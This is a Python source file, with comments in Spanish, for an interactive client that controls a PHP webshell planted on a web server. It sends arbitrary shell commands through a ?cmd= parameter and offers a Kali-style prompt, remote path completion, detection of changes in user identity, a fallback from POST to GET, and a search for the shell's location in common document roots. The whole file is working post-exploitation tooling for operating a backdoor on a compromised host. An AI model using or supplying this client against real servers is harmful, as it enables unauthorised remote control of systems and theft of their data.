#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cliente interactivo para webshell PHP mínima (?cmd=...):
- Prompt estilo Kali mostrando SOLO el usuario (via whoami); '#' si root
- Arranca en el directorio donde está alojada la webshell (si se puede deducir por la ruta del URL)
- Autorefresco de identidad solo si parece cambio de usuario (sudo/su/newgrp/docker/…)
- Autocompletado con Tab (rutas remotas) con caché e invalidación inteligente
- Historial de sesión (flechas ↑/↓) con readline
- Parseo robusto con marcadores (ignora el HTML del <pre>)
- Transporte AUTO: prueba POST y, si no ve marcadores o hay error HTTP, reintenta con GET
"""

import time
import re
import shlex
import posixpath
import requests
from urllib.parse import urlparse, unquote
from dataclasses import dataclass
from typing import List, Tuple, Optional, Dict

# ======================== Configuración principal ============================

URL = "https://tu-dominio.tld/ruta/a/shell.php"   # <-- tu URL completa
TIMEOUT = 10                                       # timeout de red (segundos)
REMOTE_CMD_TIMEOUT = 8                             # timeout remoto por comando (si existe 'timeout' en el host)

# Transporte:
#   "auto" => intenta POST y, si no ve marcadores o status >=400, reintenta con GET
#   "post" => sólo POST
#   "get"  => sólo GET
TRANSPORT = "auto"
VERIFY_TLS = True                                  # verificar TLS por defecto

# Comandos que sugieren cambio de identidad
IDENTITY_CHANGE_TRIGGERS = {
    "sudo", "su", "runuser", "doas", "newgrp", "sg",
    "setpriv", "chroot", "login", "machinectl", "nsenter",
    "unshare", "su-exec", "podman", "docker"
}

# ============================ Marcadores de salida ===========================

MARK_START = b"__WBSTART__"
MARK_END   = b"__WBEND__"
MARK_RC    = b"__WBRC__="

# ============================ Readline / Historial ===========================

try:
    import readline
    _READLINE = True
except Exception:
    _READLINE = False

# ============================== Estructuras ==================================

@dataclass
class DirEntry:
    name: str
    is_dir: bool

@dataclass
class Identity:
    user: str          # nombre de usuario (via whoami / id -un)
    uid: int           # para decidir '#' o '$'
    ts: float

# ================================ Cache dirs =================================

class DirCache:
    def __init__(self, ttl: float = 5.0):
        self.ttl = ttl
        self._cache: Dict[str, Tuple[float, List[DirEntry]]] = {}

    def get(self, path: str) -> Optional[List[DirEntry]]:
        hit = self._cache.get(path)
        if not hit:
            return None
        ts, entries = hit
        if time.time() - ts > self.ttl:
            return None
        return entries

    def put(self, path: str, entries: List[DirEntry]) -> None:
        self._cache[path] = (time.time(), entries)

    def invalidate(self, path: Optional[str] = None) -> None:
        if path is None:
            self._cache.clear()
        else:
            self._cache.pop(path, None)

# ============================== Cliente WebShell =============================

class WebShellClient:
    MUTATING_PREFIXES = (
        "mv", "rm", "touch", "mkdir", "rmdir", "cp",
        "chmod", "chown", "truncate", "tar", "unzip", "zip"
    )

    def __init__(self, url: str, timeout: int = 10, transport: str = "auto", verify_tls: bool = True):
        self.url = url
        self.timeout = timeout
        self.transport = transport.lower()
        assert self.transport in ("auto", "post", "get")
        self.verify_tls = verify_tls

        # Parseamos la ruta del URL para deducir el path del fichero en el FS
        u = urlparse(self.url)
        # Ruta URL decodificada (e.g. /site/app/shell.php)
        self.url_path = unquote(u.path) or "/"
        self.url_basename = posixpath.basename(self.url_path) or "index.php"

        self.sess = requests.Session()
        self.sess.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WebShellClient/1.7",
            "Accept": "*/*",
        })
        # Reintentos (sin penalizar 500 para permitir fallback a GET). No levantar excepción por estado.
        try:
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            retries = Retry(
                total=3,
                backoff_factor=0.3,
                status_forcelist=[429, 502, 503, 504],  # ojo: sin 500
                allowed_methods=frozenset(["GET", "POST"]),
                raise_on_status=False
            )
            adapter = HTTPAdapter(max_retries=retries)
            self.sess.mount("http://", adapter)
            self.sess.mount("https://", adapter)
        except Exception:
            pass

        self.cwd = "/"
        self.prev_cwd: Optional[str] = None
        self.remote_home = "/"
        self.dircache = DirCache(ttl=5.0)
        self.find_printf_ok = False

        # Identidad cacheada (sin TTL automático)
        self._ident: Optional[Identity] = None

        # Inicializaciones remotas
        self.cwd = self._init_cwd()
        self.remote_home = self._get_remote_home() or "/"
        self.find_printf_ok = self._detect_find_printf()
        self.identity(refresh=True)  # precarga para el primer prompt

    # -------------------------- HTTP y parseo --------------------------------

    def _http(self, cmd: str, method: str) -> tuple[int, bytes]:
        params = {"cmd": cmd}
        if method == "POST":
            r = self.sess.post(self.url, data=params, timeout=self.timeout, verify=self.verify_tls)
        else:
            r = self.sess.get(self.url, params=params, timeout=self.timeout, verify=self.verify_tls)
        # No raise_for_status: dejamos que _exec_raw decida fallback a GET si hay 4xx/5xx
        return r.status_code, r.content

    @staticmethod
    def _extract_payload(content: bytes) -> Tuple[str, Optional[int], bool]:
        """
        Devuelve (texto, rc, markers_found).
        """
        i = content.find(MARK_START)
        j = content.rfind(MARK_END)
        if i == -1 or j == -1 or j <= i:
            # Fallback HTML <pre>…</pre> (por si la shell los pone)
            m = re.search(b"<pre\\b[^>]*>(.*?)</pre>", content, flags=re.S | re.I)
            if m:
                try:
                    return m.group(1).decode("utf-8", "replace"), None, False
                except Exception:
                    return m.group(1).decode("latin-1", "replace"), None, False
            # Último recurso: decodificar todo
            try:
                return content.decode("utf-8", "replace"), None, False
            except Exception:
                return content.decode("latin-1", "replace"), None, False

        payload = content[i + len(MARK_START): j]
        rc = None
        k = payload.rfind(MARK_RC)
        if k != -1:
            k2 = payload.find(b"\n", k)
            rc_bytes = payload[k + len(MARK_RC): k2 if k2 != -1 else None].strip()
            try:
                rc = int(rc_bytes.decode("ascii", "ignore"))
            except Exception:
                rc = None
            payload = payload[:k].rstrip(b"\r\n")

        try:
            text = payload.decode("utf-8", "replace")
        except Exception:
            text = payload.decode("latin-1", "replace")
        return text, rc, True

    def _wrap_cmd(self, inner_cmd: str, force_cwd: Optional[str] = None) -> str:
        """
        Envuelve el comando con marcadores, cd al cwd y timeout remoto si existe.
        """
        cwd = force_cwd or self.cwd
        qcwd = shlex.quote(cwd)
        guarded = (
            'if command -v timeout >/dev/null 2>&1; then '
            f'timeout {int(REMOTE_CMD_TIMEOUT)}s sh -c {shlex.quote(inner_cmd)}; '
            'else '
            f'sh -c {shlex.quote(inner_cmd)}; '
            'fi'
        )
        wrapped = (
            f'printf "{MARK_START.decode()}\\n"; '
            f'( cd {qcwd} && {guarded} ); '
            'rc=$?; '
            f'printf "\\n{MARK_RC.decode()}%d\\n" "$rc"; '
            f'printf "{MARK_END.decode()}\\n"'
        )
        return wrapped

    def _exec_raw(self, wrapped_cmd: str) -> tuple[str, Optional[int], bool, str]:
        """
        Ejecuta wrapped_cmd según el transporte:
          - "post": sólo POST
          - "get":  sólo GET
          - "auto": POST y, si no hay marcadores o status >=400, prueba GET
        Devuelve (texto, rc, markers_found, method_used)
        """
        def run_once(method: str):
            status, content = self._http(wrapped_cmd, method)
            text, rc, found = self._extract_payload(content)
            return status, text, rc, found

        if self.transport == "post":
            status, text, rc, found = run_once("POST")
            return text, rc, found, "POST"

        if self.transport == "get":
            status, text, rc, found = run_once("GET")
            return text, rc, found, "GET"

        # AUTO
        status, text, rc, found = run_once("POST")
        if found and status < 400:
            return text, rc, True, "POST"

        status2, text2, rc2, found2 = run_once("GET")
        if found2 and status2 < 400:
            return text2, rc2, True, "GET"

        # Si ninguna fue “perfecta”, prioriza GET si trajo marcadores, si no devuelve POST
        if found2:
            return text2, rc2, found2, "GET"
        return text, rc, found, "POST"

    def _exec(self, cmd: str, force_cwd: Optional[str] = None) -> Tuple[str, Optional[int]]:
        wrapped = self._wrap_cmd(cmd, force_cwd=force_cwd)
        text, rc, _found, _method = self._exec_raw(wrapped)
        return text, rc

    def _exec_in_cwd(self, cmd: str) -> Tuple[str, Optional[int]]:
        return self._exec(cmd, force_cwd=self.cwd)

    # ------------------------ Deducción del directorio de la shell ------------

    def _guess_script_dir(self) -> Optional[str]:
        """
        Intenta deducir el directorio REAL del fichero PHP en el FS combinando:
        - ruta del URL (self.url_path)
        - $DOCUMENT_ROOT / docroots típicos
        - userdirs (/home/*/public_html)
        - búsqueda acotada por nombre de fichero (maxdepth)
        Devuelve dir si lo encuentra; None si no.
        """
        p = self.url_path
        bn = self.url_basename
        qp = shlex.quote(p)
        qbn = shlex.quote(bn)

        cmd = f'''
p={qp};
# 1) DOCROOTs conocidos (incluye envs si están exportados)
roots="$DOCUMENT_ROOT $APACHE_DOCUMENT_ROOT /var/www/html /var/www /usr/share/nginx/html /usr/local/apache2/htdocs /usr/local/www /srv/http /srv/www"
for r in $roots; do
  [ -z "$r" ] && continue
  f="$r$p"
  if [ -f "$f" ]; then dirname "$f"; exit 0; fi
done
# 2) userdirs
for d in /home/*/public_html; do
  [ -d "$d" ] || continue
  f="$d$p"
  if [ -f "$f" ]; then dirname "$f"; exit 0; fi
done
# 3) búsqueda acotada por nombre (rápida)
bn={qbn}
for r in /var/www /var/www/html /usr/share/nginx/html /usr/local/apache2/htdocs /srv /opt; do
  [ -d "$r" ] || continue
  found="$(find "$r" -maxdepth 6 -type f -name "$bn" 2>/dev/null | head -n1)"
  if [ -n "$found" ]; then dirname "$found"; exit 0; fi
done
echo __NOTFOUND__
'''
        out, _ = self._exec(cmd, force_cwd="/")
        line = (out or "").splitlines()[-1].strip()
        if line and line != "__NOTFOUND__":
            return line
        return None

    # ------------------------ Funciones de entorno ----------------------------

    def _init_cwd(self) -> str:
        # 1) Intentar deducir el directorio de la propia webshell
        try:
            guessed = self._guess_script_dir()
            if guessed:
                return guessed
        except requests.RequestException:
            pass
        except Exception:
            pass
        # 2) Fallback al CWD del proceso
        try:
            out, _ = self._exec("pwd -P || pwd")
            path = (out or "/").splitlines()[-1].strip()
            return path if path else "/"
        except requests.RequestException:
            return "/"

    def _get_remote_home(self) -> str:
        try:
            out, _ = self._exec('printf "%s" "$HOME"')
            return out.strip() or "/"
        except requests.RequestException:
            return "/"

    def _detect_find_printf(self) -> bool:
        try:
            _, rc = self._exec('find . -maxdepth 0 -printf ""')
            return rc == 0
        except Exception:
            return False

    # ------------------------------ Identidad ---------------------------------

    def identity(self, refresh: bool = False) -> Identity:
        """ Devuelve la identidad cacheada; si refresh=True, reconsulta en remoto.
            Sólo necesitamos el NOMBRE (whoami) y el UID para el símbolo del prompt. """
        if (not refresh) and self._ident:
            return self._ident

        cmd = r'''
who="$(whoami 2>/dev/null || true)"
uid="$(id -u 2>/dev/null || echo -1)"
if [ -z "$who" ]; then who="$(id -un 2>/dev/null || true)"; fi
if [ -z "$who" ]; then who="user"; fi
printf "%s\n%s\n" "$who" "$uid"
'''
        out, _ = self._exec(cmd, force_cwd="/")
        lines = [ln.strip() for ln in out.splitlines()]
        while len(lines) < 2:
            lines.append("")
        user = lines[0] or "user"
        try:
            uid = int(lines[1]) if lines[1] and re.fullmatch(r"-?\d+", lines[1]) else -1
        except Exception:
            uid = -1

        if user == "user":
            out2, _ = self._exec('id -un 2>/dev/null || echo user', force_cwd="/")
            user = (out2.strip().splitlines() or ["user"])[-1] or "user"

        self._ident = Identity(user=user, uid=uid, ts=time.time())
        return self._ident

    def _looks_like_identity_change(self, line: str) -> bool:
        try:
            tokens = shlex.split(line)
        except Exception:
            tokens = line.split()
        if not tokens:
            return False
        first = tokens[0]
        if first in IDENTITY_CHANGE_TRIGGERS:
            return True
        return bool(re.search(
            r'\b(sudo|su|runuser|doas|newgrp|sg|setpriv|chroot|login|machinectl|nsenter|unshare|su-exec|podman|docker)\b',
            line
        ))

    def maybe_refresh_identity(self, line: str) -> None:
        if self._looks_like_identity_change(line):
            try:
                self.identity(refresh=True)
            except Exception:
                pass

    # ------------------------------ CD y PWD ----------------------------------

    def cd(self, path: str) -> Tuple[bool, str]:
        path = path.strip()
        if path in ("", "~", "$HOME"):
            new_path = self.remote_home
        elif path == "-":
            if self.prev_cwd:
                new_path = self.prev_cwd
            else:
                return False, "No hay directorio anterior."
        elif path.startswith("/"):
            new_path = path
        else:
            new_path = posixpath.normpath(posixpath.join(self.cwd, path))

        q = shlex.quote(new_path)
        out, rc = self._exec(f'test -d {q} && cd {q} && (pwd -P || pwd) || echo __NOPE__')
        if "__NOPE__" in out or rc not in (0, None):
            return False, f"No existe el directorio: {new_path}"
        self.prev_cwd, self.cwd = self.cwd, out.splitlines()[-1].strip()
        self.dircache.invalidate()
        return True, self.cwd

    # ---------------------------- Listado remoto ------------------------------

    def listdir(self, abspath: str) -> List[DirEntry]:
        abspath = posixpath.normpath(abspath) or "/"
        cached = self.dircache.get(abspath)
        if cached is not None:
            return cached

        q = shlex.quote(abspath)
        if self.find_printf_ok:
            cmd = f'cd {q} && find . -maxdepth 1 -mindepth 1 -printf "%f\\t%y\\n"'
            out, _ = self._exec(cmd)
            entries = []
            for line in out.splitlines():
                try:
                    name, typ = line.rstrip("\n").split("\t", 1)
                except ValueError:
                    name, typ = line.strip(), "f"
                entries.append(DirEntry(name=name, is_dir=(typ == "d")))
        else:
            cmd = f'cd {q} && ls -1Ap 2>/dev/null || true'
            out, _ = self._exec(cmd)
            entries = []
            for name in out.splitlines():
                name = name.strip()
                if not name or name in (".", ".."):
                    continue
                if name.endswith("/"):
                    entries.append(DirEntry(name=name[:-1], is_dir=True))
                else:
                    entries.append(DirEntry(name=name, is_dir=False))

        self.dircache.put(abspath, entries)
        return entries

    # ------------------------------ RUN genérico ------------------------------

    def run(self, line: str) -> str:
        line = line.strip()
        if not line:
            return ""

        # Builtins
        if line in ("exit", "quit"):
            raise KeyboardInterrupt()
        if line == "pwd":
            return self.cwd
        if line == "cd":
            ok, msg = self.cd("~")
            return msg if ok else f"[!] {msg}"
        if line.startswith("cd "):
            ok, msg = self.cd(line[3:])
            return msg if ok else f"[!] {msg}"
        if line == "refreshid":
            self.identity(refresh=True)
            ident = self.identity()
            return f"[+] Usuario actual: {ident.user} (uid={ident.uid})"

        # Ejecutar en cwd
        out, _ = self._exec_in_cwd(line)

        # Invalidación de caché de dir si parece mutación de FS
        try:
            first = shlex.split(line)[0]
        except Exception:
            first = line.split(" ", 1)[0]
        if first in self.MUTATING_PREFIXES or any(tok in line for tok in (">", ">>")):
            self.dircache.invalidate(self.cwd)

        # Posible cambio de identidad (sudo/su/…)
        self.maybe_refresh_identity(line)

        return out

# ======================= Autocompletado (readline) ===========================

class RemotePathCompleter:
    """Completa rutas remotas usando DirCache/listdir del cliente."""
    def __init__(self, client: WebShellClient):
        self.client = client
        if _READLINE:
            delims = ' \t\n;|&()<>'
            try:
                readline.set_completer_delims(delims)
            except Exception:
                pass

    def _expand_base(self, token: str) -> Tuple[str, str, str]:
        tok = token
        # ~ -> HOME remoto
        if tok.startswith("~"):
            rest = tok[1:]
            if rest.startswith("/"):
                base = self.client.remote_home + rest
            elif rest == "" or rest == "/":
                base = self.client.remote_home + "/"
            else:
                base = tok
        else:
            base = tok

        if base.startswith("/"):
            dirpart, _, needle = base.rpartition("/")
            dir_abs = dirpart if dirpart else "/"
            shown_prefix = dir_abs + "/" if dir_abs != "/" else "/"
        else:
            dirpart, _, needle = base.rpartition("/")
            if dirpart:
                dir_abs = posixpath.normpath(posixpath.join(self.client.cwd, dirpart))
                shown_prefix = dirpart + "/"
            else:
                dir_abs = self.client.cwd
                shown_prefix = ""
        return dir_abs, shown_prefix, needle

    def candidates(self, token: str) -> List[str]:
        dir_abs, shown_prefix, needle = self._expand_base(token)
        try:
            entries = self.client.listdir(dir_abs)
        except Exception:
            return []

        cands = []
        for e in entries:
            if e.name.startswith(needle):
                suffix = "/" if e.is_dir else ""
                cands.append(f"{shown_prefix}{e.name}{suffix}")
        return sorted(cands)

    def __call__(self, text: str, state: int) -> Optional[str]:
        if state == 0:
            if _READLINE:
                buf = readline.get_line_buffer()
                beg = readline.get_begidx()
                end = readline.get_endidx()
                token = buf[beg:end]
            else:
                token = text
            self._matches = self.candidates(token)
        try:
            return self._matches[state]
        except Exception:
            return None

# =============================== Prompt ======================================

def build_prompt(client: WebShellClient) -> str:
    ident = client.identity(refresh=False)
    user_label = ident.user if ident.user else "user"
    top = f"┌──({user_label})-[{client.cwd}]"
    sym = "#" if ident.uid == 0 or ident.user == "root" else "$"
    bottom = f"└─{sym} "
    return f"{top}\n{bottom}"

# =============================== Main ========================================

def main():
    print("Cliente interactivo para WebShell PHP (Ctrl+C para salir)")
    client = WebShellClient(URL, TIMEOUT, transport=TRANSPORT, verify_tls=VERIFY_TLS)

    completer = RemotePathCompleter(client)
    if _READLINE:
        try:
            readline.parse_and_bind("tab: complete")
            readline.set_completer(completer)
            readline.set_history_length(1000)
        except Exception:
            pass

    try:
        while True:
            try:
                prompt = build_prompt(client)
                line = input(prompt)

                # Historial de sesión (evita duplicados consecutivos)
                if _READLINE and line.strip():
                    hlen = readline.get_current_history_length()
                    last = readline.get_history_item(hlen) if hlen > 0 else None
                    if last != line:
                        readline.add_history(line)

                out = client.run(line)
                if out:
                    print(out)
            except requests.RequestException as e:
                print(f"[!] Error de red: {e}")
            except KeyboardInterrupt:
                raise
    except KeyboardInterrupt:
        print("\n[+] Cerrando conexión.")

if __name__ == "__main__":
    main()
